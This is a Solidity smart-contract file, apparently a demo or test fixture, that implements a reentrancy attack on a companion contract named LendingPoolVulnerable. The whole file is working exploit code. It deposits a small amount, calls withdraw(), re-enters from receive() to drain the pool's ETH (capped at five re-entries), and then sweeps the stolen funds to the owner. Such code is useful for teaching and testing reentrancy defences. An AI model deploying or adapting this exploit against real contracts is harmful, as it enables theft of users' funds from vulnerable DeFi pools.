// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

/// @dev FOR DEMO ONLY — exploits `LendingPoolVulnerable.withdraw()`.
/// Pattern: become a contributor with a small deposit, then trigger
/// `withdraw()` and re-enter from `receive()` until the pool is drained
/// (capped by `MAX_REENTRIES` to keep the demo bounded).

interface ILendingPoolVuln {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function deposits(address) external view returns (uint256);
}

contract ReentrancyAttacker {
    ILendingPoolVuln public immutable pool;
    address public immutable owner;
    uint256 public attackAmount;
    uint256 public attackCount;
    uint256 public constant MAX_REENTRIES = 5;

    constructor(address _pool) {
        pool = ILendingPoolVuln(_pool);
        owner = msg.sender;
    }

    /// Bootstrap: deposit so the attacker passes the `disposableValue >= amount` check
    function deposit() external payable {
        require(msg.value > 0, "zero deposit");
        attackAmount = msg.value;
        pool.deposit{value: msg.value}();
    }

    /// Allow attacker contract to fund the initial deposit
    receive() external payable {
        // Re-enter only when called back by the pool during withdraw().
        // `attackCount < MAX_REENTRIES` bounds the loop; the second condition
        // prevents an out-of-gas if the pool is empty.
        if (
            attackCount < MAX_REENTRIES &&
            address(pool).balance >= attackAmount
        ) {
            attackCount++;
            pool.withdraw(attackAmount);
        }
    }

    function attack() external {
        require(msg.sender == owner, "not owner");
        pool.withdraw(attackAmount);
    }

    /// Drain accumulated ETH back to the deployer for assertion convenience
    function sweep(address payable to) external {
        require(msg.sender == owner, "not owner");
        (bool ok, ) = to.call{value: address(this).balance}("");
        require(ok, "sweep failed");
    }
}
